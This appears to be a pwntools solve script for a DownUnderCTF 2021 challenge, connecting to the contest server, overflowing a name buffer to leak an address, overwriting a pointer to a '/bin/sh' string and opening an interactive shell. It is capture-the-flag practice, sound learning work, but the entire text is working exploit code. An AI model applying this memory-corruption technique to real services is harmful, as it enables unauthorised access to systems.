from pwn import *
io = remote("pwn-2021.duc.tf",31907)

io.sendlineafter("Welcome, what is your name?","A"* 0x20)

io.sendlineafter("> ","2")
io.recvuntil("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")

leak = u64(io.recv(6).ljust(8,b"\x00"))
binshStr = leak + 127

log.info("Binsh addr: " + hex(binshStr))
io.sendline("1")

io.recvuntil("What would you like to change your username to?")
io.sendline(b"A" * 0x20 + p64(binshStr))

io.sendlineafter("> ","1337")
io.sendlineafter("guess: ",str(0x464c457f))

io.interactive()
